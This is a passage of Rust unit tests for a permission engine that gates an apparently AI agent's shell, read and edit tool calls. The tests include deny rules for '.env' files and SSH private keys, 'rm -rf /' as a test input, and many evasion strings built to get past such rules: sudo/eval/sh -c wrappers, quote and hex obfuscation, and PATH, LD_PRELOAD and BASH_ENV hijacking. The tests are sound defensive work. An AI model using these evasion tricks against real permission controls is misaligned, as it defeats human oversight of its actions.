        assert_eq!(write(&r, "src/../secrets/key"), Kind::Deny);
        assert_eq!(write(&r, "src/main.rs"), Kind::Allow);
        assert_eq!(bash(&r, "echo x > secrets/key"), Kind::Deny);
        assert_eq!(bash(&r, "echo x | tee secrets/key"), Kind::Deny);
    }

    #[test]
    fn read_rules_cover_reads() {
        let r = rules(&[], &[], &["Read(*.env)", "Read(~/.ssh/**)"], None);
        let reads = [PathBuf::from("app/.env")];
        let call = Call {
            tool: "grep",
            main_arg: Some("path"),
            value: Some("app/.env"),
            reads: &reads,
            writes: &[],
        };
        assert_eq!(r.decide(&call).kind, Kind::Deny);
        let ssh = [PathBuf::from("/home/u/.ssh/id_ed25519")];
        let call = Call {
            tool: "read",
            main_arg: Some("path"),
            value: Some("/home/u/.ssh/id_ed25519"),
            reads: &ssh,
            writes: &[],
        };
        assert_eq!(r.decide(&call).kind, Kind::Deny);
    }

    #[test]
    fn an_edit_allow_lets_writes_inside_run_and_the_default_stops_others() {
        let r = rules(&["Edit(src/**)"], &[], &[], Some("deny"));
        assert_eq!(write(&r, "src/a.rs"), Kind::Allow);
        assert_eq!(write(&r, "docs/a.md"), Kind::Deny);
        assert_eq!(
            bash(&r, "echo x > src/a.rs"),
            Kind::Deny,
            "the command itself is not allowed"
        );
    }

    #[test]
    fn tool_names_ignore_case_and_star_matches_every_tool() {
        let r = rules(&[], &[], &["*(secret*)"], None);
        assert_eq!(write(&r, "secret.txt"), Kind::Deny);
        let r = rules(&[], &[], &["BASH(ls:*)"], None);
        assert_eq!(bash(&r, "ls -la"), Kind::Deny);
    }

    #[test]
    fn no_rules_allow_everything() {
        let r = Rules::none();
        assert!(r.is_open());
        assert_eq!(bash(&r, "rm -rf /"), Kind::Allow);
        let r = rules(&[], &[], &[], Some("ask"));
        assert_eq!(bash(&r, "ls"), Kind::Ask);
        assert_eq!(
            r.decide(&Call {
                tool: "bash",
                main_arg: Some("command"),
                value: Some("ls"),
                reads: &[],
                writes: &[],
            })
            .reason,
            Reason::Default
        );
    }

    #[test]
    fn bad_rules_name_the_file_and_the_rule() {
        let lists = Lists {
            deny: vec!["Bash(git push".into()],
            ..Lists::default()
        };
        let layer = Layer {
            path: PathBuf::from("/c.toml"),
            settings: Settings {
                permissions: lists,
                ..Settings::default()
            },
        };
        let error = Rules::from_layers(&[layer], Path::new("/w"), None).unwrap_err();
        assert!(
            error.starts_with("/c.toml: rule \"Bash(git push\""),
            "{error}"
        );
        for bad in ["(x)", "Bash()", "Bash(:*)", "Edit(x:*)"] {
            assert!(
                parse_rule(Kind::Deny, bad, &Arc::from("f")).is_err(),
                "{bad}"
            );
        }
    }

    #[test]
    fn a_bad_default_is_an_error() {
        let lists = Lists {
            default: Some("maybe".into()),
            ..Lists::default()
        };
        let layer = Layer {
            path: PathBuf::from("/c.toml"),
            settings: Settings {
                permissions: lists,
                ..Settings::default()
            },
        };
        assert!(Rules::from_layers(&[layer], Path::new("/w"), None).is_err());
    }

    #[test]
    fn glob_any_crosses_slashes() {
        assert!(glob_any(b"git push *", b"git push origin/main"));
        assert!(glob_any(b"*", b""));
        assert!(!glob_any(b"git push", b"git push x"));
    }

    #[test]
    fn normalize_resolves_dots() {
        assert_eq!(
            normalize(Path::new("/w/src/../secrets/./k")),
            PathBuf::from("/w/secrets/k")
        );
    }

    fn grep_in(rules: &Rules, folder: &str) -> Kind {
        let reads = [PathBuf::from(folder)];
        rules
            .decide(&Call {
                tool: "grep",
                main_arg: Some("path"),
                value: Some(folder),
                reads: &reads,
                writes: &[],
            })
            .kind
    }

    #[test]
    fn review_scripts_behind_a_runner_are_checked() {
        let r = rules(&[], &[], &["Bash(git push:*)"], None);
        for command in [
            "sudo sh -c 'git push'",
            "xargs sh -c 'git push'",
            "find . -exec sh -c 'git push' \\;",
            "setsid sh -c 'git push'",
            "dash -c 'git push'",
            "busybox sh -c 'git push'",
            "eval 'git push'",
            "eval \"git push\"",
            "bash -c -- 'git push'",
        ] {
            assert_eq!(bash(&r, command), Kind::Deny, "{command}");
        }
    }

    #[test]
    fn review_quoting_and_unknown_programs_do_not_slip_past() {
        let r = rules(&[], &[], &["Bash(git push:*)"], None);
        for command in [
            "echo `g'i't push`",
            "echo \"$(g'i't push)\"",
            "sh -xc \"g'i't push\"",
            "x=git; $x push",
            "/usr/bin/gi[t] push",
            "$'\\x67it' push",
        ] {
            assert_eq!(bash(&r, command), Kind::Deny, "{command}");
        }
    }

    #[test]
    fn review_git_options_before_the_subcommand() {
        let r = rules(&[], &[], &["Bash(git push:*)"], None);
        for command in ["git -C . push", "git -c a=b push", "git --no-pager push"] {
            assert_eq!(bash(&r, command), Kind::Deny, "{command}");
        }
        assert_eq!(bash(&r, "git log --grep push"), Kind::Allow);
    }

    #[test]
    fn review_cd_moves_later_targets() {
        let r = rules(&[], &[], &["Edit(secrets/**)"], None);
        assert_eq!(bash(&r, "cd secrets && echo x > k"), Kind::Deny);
        assert_eq!(bash(&r, "cd secrets; echo x | tee k"), Kind::Deny);
        assert_eq!(
            bash(&r, "cd \"$D\" && echo x > k"),
            Kind::Deny,
            "an unknown cd"
        );
        let r = rules(
            &["Bash(cd:*)", "Bash(echo:*)", "Edit(src/**)"],
            &[],
            &[],
            Some("deny"),
        );
        assert_eq!(bash(&r, "cd /tmp && echo x > src/a"), Kind::Deny);
    }

    #[test]
    fn review_home_and_variable_targets() {
        let r = rules(&[], &[], &["Edit(~/.ssh/**)"], None);
        for command in [
            "echo x > ~/.ssh/k",
            "echo x > $HOME/.ssh/k",
            "echo x > ~/.ssh/../.ssh/k",
            "F=x; echo x > $F",
        ] {
            assert_eq!(bash(&r, command), Kind::Deny, "{command}");
        }
    }

    #[test]
    fn review_a_search_of_a_folder_holding_a_denied_path() {
        let r = rules(&[], &[], &["Read(secrets/**)"], None);
        assert_eq!(grep_in(&r, "."), Kind::Deny);
        assert_eq!(grep_in(&r, "/work"), Kind::Deny);
        assert_eq!(grep_in(&r, "src"), Kind::Allow);
    }

    #[test]
    fn review_a_glob_with_a_trailing_star_matches_no_more_words() {
        let r = rules(&[], &[], &["Bash(git push *)"], None);
        assert_eq!(bash(&r, "git push"), Kind::Deny);
        assert_eq!(bash(&r, "git push x"), Kind::Deny);
    }

    #[test]
    fn review_allow_does_not_over_grant() {
        let r = rules(&["Bash(git:*)"], &[], &[], Some("deny"));
        for command in [
            "/usr/bin/time -o git rm -rf x",
            "env -a git rm x",
            "./git status",
            "/tmp/evil/git status",
            "PATH=/tmp/evil git status",
            "LD_PRELOAD=/tmp/x.so git status",
            "BASH_ENV=/tmp/x git status",
        ] {
            assert_eq!(bash(&r, command), Kind::Deny, "{command}");
        }
        assert_eq!(bash(&r, "git status"), Kind::Allow);
        let r = rules(&[], &[], &["Edit(secrets/**)"], None);
        assert_eq!(bash(&r, "echo x | sudo tee secrets/k"), Kind::Deny);
    }

    #[test]
    fn review_path_patterns_cover_what_lies_below() {
        let deny = |pattern: &str, path: &str| write(&rules(&[], &[], &[pattern], None), path);
        assert_eq!(deny("Edit(secrets)", "secrets/k"), Kind::Deny);
        assert_eq!(deny("Edit(vault/*)", "vault/a/b"), Kind::Deny);
        assert_eq!(deny("Edit(.env)", "a/.env/x"), Kind::Deny);
        assert_eq!(deny("Edit(../outside/**)", "../outside/k"), Kind::Deny);
        assert_eq!(deny("Edit(secrets/**)", "public/k"), Kind::Allow);
        let r = rules(&[], &[], &["Bash(git push:* )"], None);
        assert_eq!(
            bash(&r, "git push"),
            Kind::Deny,
            "spaces inside the parentheses are trimmed"
        );
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn review_case_does_not_matter_on_macos() {
        let r = rules(&[], &[], &["Edit(secrets/**)", "Bash(git push:*)"], None);
        assert_eq!(write(&r, "SECRETS/k"), Kind::Deny);
        assert_eq!(bash(&r, "echo x > Secrets/k"), Kind::Deny);
        assert_eq!(bash(&r, "GIT push"), Kind::Deny);
    }

    #[test]
    fn review_a_tilde_rule_without_home_is_an_error() {
        let layer = Layer {
            path: PathBuf::from("/c.toml"),
            settings: Settings {
                permissions: Lists {
                    deny: vec!["Edit(~/.ssh/**)".into()],
                    ..Lists::default()
                },
                ..Settings::default()
            },
        };
        assert!(Rules::from_layers(&[layer], Path::new("/w"), None).is_err());
    }

    #[test]
    fn review_input_redirects_and_path_words_count() {
        let r = rules(&[], &[], &["Read(secrets/**)", "Edit(vault/**)"], None);
        for command in [
            "cat < secrets/k",
            "cat secrets/k",
            "cp a vault/k",
            "sed -i s/a/b/ vault/k",
        ] {
            assert_eq!(bash(&r, command), Kind::Deny, "{command}");
        }
        let r = rules(&[], &[], &["Bash(*)"], None);
        assert_eq!(bash(&r, ""), Kind::Deny);
        assert_eq!(bash(&r, "  "), Kind::Deny);
    }

    #[test]
    fn review_tool_names_are_listed_for_a_check() {
        let r = rules(&[], &[], &["Bsh(git push:*)", "Read(x)", "*(y)"], None);
        let names: Vec<&str> = r.tool_names().map(|(name, _, _)| name).collect();
        assert_eq!(names, ["bsh"]);
    }

    #[test]
    fn review_a_long_command_stays_linear() {
        let r = rules(&[], &[], &["Bash(git push *)"], None);
        let long = "a ".repeat(20_000);
        let start = std::time::Instant::now();
        assert_eq!(bash(&r, &long), Kind::Allow);
        assert!(
            start.elapsed() < std::time::Duration::from_secs(2),
            "{:?}",
            start.elapsed()
        );
    }
}
